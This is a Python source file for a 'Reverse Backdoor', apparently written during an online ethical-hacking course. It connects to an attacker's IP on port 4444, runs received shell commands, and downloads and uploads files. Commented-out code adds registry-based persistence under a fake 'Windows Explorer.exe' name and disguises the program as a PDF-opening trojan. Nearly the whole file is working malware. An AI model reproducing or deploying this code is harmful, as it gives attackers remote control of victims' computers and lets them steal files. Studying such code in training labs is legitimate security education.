# Reverse Backdoor
# This works with Listener script.

#!/usr/bin/env python
import socket, subprocess, json, os, optparse, base64 #, sys

class Backdoor:
    def __init__(self, ip, port):
        # self.become_persistent()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    '''
    def become_presistent(self):
        evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
        if not os.path.exists(evil_file_location):
            shutil.copyfile(sys.executable, evil_file_location)
            subprocess.call('reg add HKCU\Sortware\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"' , shell=True)
    '''

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
             try:
                 json_data = json_data + self.connection.recv(1024)
                 return json.loads(json_data)
             except ValueError:
                 continue

    def execute_system_command(self, command):
        # DEVNULL = open(os.devnull, 'wb')
        # return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)
        return subprocess.check_output(command, shell=True)

    def change_working_directory_to(self, path):
        os.chdir(path)
        return "[+] Changing working directory to " + path + "\n"
   
    def read_file(self, path):
        with open(path, "rb") as file:
             return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload successful.\n"

    def run(self):
        while True:
            command = self.reliable_receive()

            try:
                if command[0] == "exit":
                    self.connection.close()
                    # sys.exit()
                    exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_directory_to(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1])
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.execute_system_command(command)
            except Exception:
                command_result = "[-] Error during command execution."

            self.reliable_send(command_result)

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-i", "--ip", dest="ip", help="Your (Hacker\'s) IP address (Ex.: 10.0.2.13)")
    (options, arguments) = parser.parse_args()
    if not options.ip:
        parser.error("[-] Please specify your (hacker\'s) IP address (Ex.: 10.0.2.13). Use --help for more info.")
    return options

options = get_arguments()
my_backdoor = Backdoor(options.ip, 4444)
my_backdoor.run()

'''
file_name = sys.MEIPASS + "\sample.pdf"
subprocess.Popen(file_name, shell=True)

try:
    my_backdoor = Backdoor(options.ip, 4444)
    my_backdoor.run()
except Exception:
    sys.exit()
'''

'''
https://www.udemy.com/learn-python-and-ethical-hacking-from-scratch/learn/v4/t/lecture/10547202?start=0 (Handling Unknown Exceptions)
For commented code in Reverse Backdoor File:
    https://www.udemy.com/learn-python-and-ethical-hacking-from-scratch/learn/v4/t/lecture/10547482?start=0 (Running Executables Silentely)
    https://www.udemy.com/learn-python-and-ethical-hacking-from-scratch/learn/v4/t/lecture/10548776?start=15 (Running Programs on Startup)
    https://www.udemy.com/learn-python-and-ethical-hacking-from-scratch/learn/v4/t/lecture/10549256?start=15 (Creating a Trojan By Embedding Files In Program Code)
'''
